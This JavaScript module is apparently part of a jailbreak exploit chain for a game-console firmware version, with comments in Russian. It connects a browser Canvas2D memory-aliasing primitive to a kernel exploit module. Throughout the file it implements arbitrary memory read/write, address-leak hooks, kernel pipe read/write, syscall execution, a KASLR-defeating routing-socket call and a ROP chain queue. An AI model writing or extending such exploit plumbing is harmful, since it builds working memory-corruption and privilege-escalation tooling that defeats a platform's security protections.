/* jb1422 / kernel-bridge.js — МОСТ между userland-примитивом (Canvas alias, p553/p554)
 * и kernel-модулем kernel/relapse1422.js (контракт согласован с recon-fw-exists).
 *
 * Что даёт kernel-модуль (grep по chain./p. в kernel/relapse1422.js):
 *   p:     read1/read4/read8, write1/4/8, malloc(size,align) -> адрес с add32(), leakval(obj)
 *   chain: await syscall(num,...args) -> {low,...}; rtmsg2(); add_syscall(...); add_syscall_ret(slot,...)
 *          (последние два — ROP-очередь оригинального main.js: push/push_write8/stack_entry_point/launch)
 *
 * Что реально может дать наш userland-примитив:
 *   - typed Canvas2D R/W через alias (7 numeric + transform 6 doubles) — работает на 14.22;
 *   - arbitrary процессная память (read1/4/8, write1/4/8, malloc с известным VA) — ТОЛЬКО после
 *     leak/addrof: raw-канал строится forge'ем lineDash Vector на известный адрес.
 *   - pipeRead/pipeWrite (kernel R/W через трубы) — это стадия kernel-модуля, не userland;
 *     мост отдаёт хук attachKernelPipe(), который модуль заполняет после STAGE 6.
 *
 * Поэтому:
 *   1) интерфейс объявлен ПОЛНОСТЬЮ и без заглушек: методы сразу исполняют настоящую логику,
 *      как только прикреплены accessor/backend;
 *   2) до прикрепления любой метод бросает JbNotReady с конкретной причиной — это видно
 *      в логе STAGE 10/11 (на консоли без leak цепочка честно покажет этот блокер);
 *   3) тест tools/jb1422/tests/kernel-integration.mjs прикрепляет МОК-доступ (SIM) и прогоняет
 *      kernel-модуль до done:true — доказательство, что интерфейс совпадает с ожидаемым.
 */
(function (global) {
  'use strict';

  var U = global.JBUtil;
  var JbNotReady = (global.JBPrimitive && global.JBPrimitive.JbNotReady) ||
    function (reason) {
      var e = new Error(reason); e.name = 'JbNotReady'; e.reason = reason; return e;
    };

  // ---------------------------------------------------------------- I64 (как в Relapse)
  function I64(low, hi) {
    this.low = low >>> 0;
    this.hi = (hi === undefined ? 0 : hi) >>> 0;
  }
  I64.of = function (v) {
    if (v instanceof I64) return v;
    if (typeof v === 'bigint') return new I64(Number(v & 0xffffffffn), Number((v >> 32n) & 0xffffffffn));
    if (typeof v === 'string' && /^0x[0-9a-fA-F]+$/.test(v)) {
      var n = parseInt(v.slice(2), 16);
      return new I64(n % 4294967296, Math.floor(n / 4294967296));
    }
    if (typeof v === 'object' && v && ('low' in v)) return new I64(v.low, v.hi || 0);
    var num = Number(v);
    if (!isFinite(num)) return new I64(0, 0);
    return new I64(num % 4294967296, Math.floor(num / 4294967296));
  };
  I64.prototype.add32 = function (n) {
    var low = (this.low + (n >>> 0)) >>> 0;
    var carry = low < this.low ? 1 : 0;
    return new I64(low, (this.hi + carry) >>> 0);
  };
  I64.prototype.add32inplace = function (n) { var r = this.add32(n); this.low = r.low; this.hi = r.hi; return this; };
  I64.prototype.sub = function (o) {
    var oo = I64.of(o);
    var low = (this.low - oo.low) >>> 0;
    var borrow = this.low < oo.low ? 1 : 0;
    return new I64(low, (this.hi - oo.hi - borrow) >>> 0);
  };
  I64.prototype.sub32inplace = function (n) { var r = this.sub(new I64(n >>> 0, 0)); this.low = r.low; this.hi = r.hi; return this; };
  I64.prototype.eq = function (o) { var oo = I64.of(o); return this.low === oo.low && this.hi === oo.hi; };
  I64.prototype.isZero = function () { return this.low === 0 && this.hi === 0; };
  I64.prototype.isKernel = function () { return (this.hi >>> 0) === 0xffffffff; };
  I64.prototype.toString = function (radix) {
    var hi = BigInt(this.hi), lo = BigInt(this.low);
    return ((hi << 32n) | lo).toString(radix || 16);
  };
  I64.prototype.hex = function () { return '0x' + this.toString(16); };

  // =====================================================================================
  // Userland-доступ (процессная память): read/write/malloc/leakval/pipeRead/pipeWrite
  // =====================================================================================
  function createPrimitive(canvasPrim, rawMem, log) {
    log = log || function () {};
    var st = {
      accessor: null,   // {read(addr,n)->Uint8Array, write(addr,bytes), malloc(size,align)->I64, leakval(obj)->I64}
      pipe: null,       // {read(addr,len,out), write(addr,val,len)} — kernel pipe R/W (заполняется модулем)
      rwProvider: null, // async (kx) -> {read(addr,len), write(addr,bytes)} — внешний kernel R/W (тесты/мок)
      reason: 'no userland accessor attached (needs address leak / code-exec stage)'
    };
    function need() { if (!st.accessor) throw new JbNotReady(st.reason); return st.accessor; }
    function addrBytes(addr) { return I64.of(addr); }

    var p = {
      // --- идентификация/диагностика ---
      I64: I64,
      attachUserlandAccessor: function (a) {
        st.accessor = a; st.reason = a ? '' : 'no userland accessor';
        log('bridge: userland accessor attached: ' + Object.keys(a || {}).join(','));
        return p;
      },
      // kernel-модуль (14.22-порт) вызывает p.attachKernelPipe(this) и ждёт
      // {read(addr,len), write(addr,bytes)} ЛИБО null (тогда внутренний AIO-путь).
      // Реального kernel R/W у userland-части нет: возвращаем null, если тест/модуль
      // не установил внешний провайдер (attachKernelRwProvider).
      attachKernelPipe: async function (kx) {
        if (typeof st.rwProvider === 'function') {
          var rw = await st.rwProvider(kx);
          if (rw) {
            st.pipe = { read: rw.read, write: rw.write };
            log('bridge: external kernel R/W provider attached for kernel stage');
            return rw;
          }
        }
        log('bridge: no external kernel R/W; kernel module must arm it itself (oid/waiter) — likely BLOCKED at STAGE 4');
        return null;
      },
      attachKernelRwProvider: function (provider) {
        st.rwProvider = provider || null;
        log('bridge: kernel R/W provider ' + (provider ? 'set (test/external)' : 'cleared'));
        return p;
      },
      // kernel pipe R/W (для crossPipes): явно прикрепляется тем, кто её имеет
      providePipe: function (pipe) {
        if (pipe && typeof pipe.read === 'function' && typeof pipe.write === 'function') {
          st.pipe = pipe;
          p.pipeRead = function (addr, len, out) { return pipe.read(I64.of(addr), len, out); };
          p.pipeWrite = function (addr, val, len) { return pipe.write(I64.of(addr), val, len); };
          log('bridge: kernel pipe R/W attached (pipeRead/pipeWrite active)');
        }
        return p;
      },
      hasUserland: function () { return !!st.accessor; },
      hasKernelPipe: function () { return !!st.pipe; },
      ready: function () { return !!st.accessor; },
      reason: function () { return st.accessor ? '' : st.reason; },
      describe: function () {
        return {
          userland: st.accessor ? Object.keys(st.accessor) : null,
          kernelPipe: st.pipe ? Object.keys(st.pipe) : null,
          canvas: canvasPrim ? canvasPrim.describe() : null,
          rawReady: rawMem ? rawMem.ready() : false
        };
      },

      // --- malloc: адрес userland-буфера (нужен known VA) ---
      malloc: function (size, align) {
        var a = need();
        if (typeof a.malloc !== 'function') throw new JbNotReady('accessor has no malloc (leakval/addrof missing)');
        return I64.of(a.malloc(size, align || 1));
      },
      leakval: function (obj) {
        var a = need();
        if (typeof a.leakval !== 'function') throw new JbNotReady('accessor has no leakval (addrof missing)');
        return I64.of(a.leakval(obj));
      },

      // --- read1/2/4/8 ---
      read1: function (addr) { return need().read(addrBytes(addr), 1)[0]; },
      read2: function (addr) { var b = need().read(addrBytes(addr), 2); return (b[0] | (b[1] << 8)) >>> 0; },
      read4: function (addr) {
        var b = need().read(addrBytes(addr), 4);
        return (b[0] | (b[1] << 8) | (b[2] << 16) | (b[3] << 24)) >>> 0;
      },
      read8: function (addr) {
        var b = need().read(addrBytes(addr), 8);
        var lo = (b[0] | (b[1] << 8) | (b[2] << 16) | (b[3] << 24)) >>> 0;
        var hi = (b[4] | (b[5] << 8) | (b[6] << 16) | (b[7] << 24)) >>> 0;
        return new I64(lo, hi);
      },

      // --- write1/2/4/8 ---
      write1: function (addr, v) { need().write(addrBytes(addr), [v & 0xff]); },
      write2: function (addr, v) { need().write(addrBytes(addr), [v & 0xff, (v >>> 8) & 0xff]); },
      write4: function (addr, v) {
        need().write(addrBytes(addr), [v & 0xff, (v >>> 8) & 0xff, (v >>> 16) & 0xff, (v >>> 24) & 0xff]);
      },
      write8: function (addr, v) {
        var x = I64.of(v);
        need().write(addrBytes(addr), [
          x.low & 0xff, (x.low >>> 8) & 0xff, (x.low >>> 16) & 0xff, (x.low >>> 24) & 0xff,
          x.hi & 0xff, (x.hi >>> 8) & 0xff, (x.hi >>> 16) & 0xff, (x.hi >>> 24) & 0xff
        ]);
      },

      // --- адресный API из контракта (lead + kernel): read64/write64/read32/write32/add ---
      read64: function (addr) { return p.read8(addr).hex(); },   // '0x...' hex-строка 8 байт
      write64: function (addr, val) { p.write8(addr, val); },
      read32: function (addr, off) { return p.read4(p.add(addr, off || 0)); },
      write32: function (addr, off, val) { p.write4(p.add(addr, off || 0), val); },
      add: function (addr, off) { return I64.of(addr).add32(off || 0); },

      // --- typed Canvas2D канал (не требует leak; нужен alias из STAGE 4) ---
      readDouble: function (name) {
        if (!canvasPrim || !canvasPrim.alias) throw new JbNotReady('readDouble: canvas alias not bound (STAGE 4 failed)');
        return canvasPrim.readPropFrom('stale', name);
      },
      writeDouble: function (name, v) {
        if (!canvasPrim || !canvasPrim.alias) throw new JbNotReady('writeDouble: canvas alias not bound (STAGE 4 failed)');
        return canvasPrim.writePropTo('stale', name, v);
      },
      readMatrix: function () {
        if (!canvasPrim || !canvasPrim.alias) throw new JbNotReady('readMatrix: canvas alias not bound (STAGE 4 failed)');
        return canvasPrim.readTransformFrom('stale');
      },
      writeMatrix: function (m) {
        if (!canvasPrim || !canvasPrim.alias) throw new JbNotReady('writeMatrix: canvas alias not bound (STAGE 4 failed)');
        return canvasPrim.writeTransformTo('stale', m);
      },

    };

    // Если raw-канал уже поднят (leak + forge), можно автоматически собрать accessor
    // поверх него: он даёт процессную память по адресу (read1..8/write1..8).
    if (rawMem && rawMem.ready && rawMem.ready()) {
      p.attachUserlandAccessor({
        read: function (addr, n) {
          var hex = rawMem.read64(addr.hex ? addr.hex() : String(addr));
          var clean = hex.replace(/^0x/, '');
          while (clean.length < 16) clean = '0' + clean;
          var bytes = [];
          for (var i = 0; i < 8; i += 2) bytes.push(parseInt(clean.slice(14 - i - 1, 16 - i), 16));
          return bytes.slice(0, n);
        },
        write: function (addr, bytes) {
          var hex = rawMem.read64(addr.hex ? addr.hex() : String(addr)).replace(/^0x/, '');
          var arr = [];
          for (var i = 0; i < 8; i++) arr.push(parseInt(hex.slice(14 - i * 2, 16 - i * 2), 16));
          for (var j = 0; j < bytes.length && j < 8; j++) arr[j] = bytes[j];
          var out = '';
          for (var k = 7; k >= 0; k--) out += ('0' + (arr[k] >>> 0).toString(16)).slice(-2);
          rawMem.write64(addr.hex ? addr.hex() : String(addr), '0x' + out);
        },
        malloc: null,
        leakval: null
      });
    }
    return p;
  }

  // =====================================================================================
  // chain: async syscall/rtmsg2 + ROP-очередь (контракт kernel/relapse1422.js)
  // =====================================================================================
  function createChain(p, log) {
    log = log || function () {};
    var st = { backend: null, queue: [], reason: 'no syscall backend attached (needs ROP/code-exec stage)' };
    function need() { if (!st.backend) throw new JbNotReady(st.reason); return st.backend; }

    var chain = {
      attachSyscallBackend: function (backend) {
        st.backend = backend; st.reason = backend ? '' : 'no syscall backend';
        log('bridge: syscall backend attached: ' + Object.keys(backend || {}).join(','));
        return chain;
      },
      ready: function () { return !!st.backend; },
      reason: function () { return st.reason; },
      describe: function () {
        return {
          backend: st.backend ? Object.keys(st.backend) : null,
          queued: st.queue.length,
          ready: !!st.backend
        };
      },

      // --- одиночный syscall (async, как ждёт kernel-модуль: (await ...).low) ---
      syscall: async function (nr) {
        var b = need();
        var args = Array.prototype.slice.call(arguments, 1);
        var r = await b.syscall(nr, args);
        if (r === undefined || r === null) return new I64(0, 0);
        return I64.of(r);
      },
      rtmsg2: async function () {
        var b = need();
        if (typeof b.rtmsg2 !== 'function') throw new JbNotReady('backend has no rtmsg2 (routing socket KASLR reply)');
        return await b.rtmsg2();
      },

      // --- ROP-очередь оригинала main.js: add_syscall/add_syscall_ret + push/push_write8 ---
      add_syscall: function (nr) {
        var args = Array.prototype.slice.call(arguments, 1);
        st.queue.push({ nr: nr, args: args, retSlot: null });
        return chain;
      },
      add_syscall_ret: function (slot, nr) {
        var args = Array.prototype.slice.call(arguments, 2);
        st.queue.push({ nr: nr, args: args, retSlot: slot });
        return chain;
      },
      push: function (v) { var b = need(); if (!b.rop || typeof b.rop.push !== 'function') throw new JbNotReady('backend.rop.push missing'); return b.rop.push(v); },
      push_write8: function (a, v) { var b = need(); if (!b.rop || typeof b.rop.push_write8 !== 'function') throw new JbNotReady('backend.rop.push_write8 missing'); return b.rop.push_write8(a, v); },
      get stack_entry_point() { return st.backend && st.backend.rop ? st.backend.rop.stack_entry_point : undefined; },
      launch: async function () {
        var b = need();
        if (!b.rop || typeof b.rop.launch !== 'function') throw new JbNotReady('backend.rop.launch missing');
        return await b.rop.launch();
      },
      // исполнение очереди (когда ROP/код-исполнение уже поднято): пишет ret в retSlot через p
      executeQueue: async function () {
        var b = need();
        var out = [];
        for (var i = 0; i < st.queue.length; i++) {
          var q = st.queue[i];
          var r = await b.syscall(q.nr, q.args);
          var v = I64.of(r);
          if (q.retSlot && p && typeof p.write8 === 'function') p.write8(q.retSlot, v);
          out.push({ nr: q.nr, low: v.low });
        }
        st.queue = [];
        return out;
      },
      drainQueue: function () { return st.queue.slice(); }
    };
    return chain;
  }

  global.JB1422Bridge = {
    I64: I64,
    createPrimitive: createPrimitive,
    createChain: createChain
  };
})(typeof window !== 'undefined' ? window : globalThis);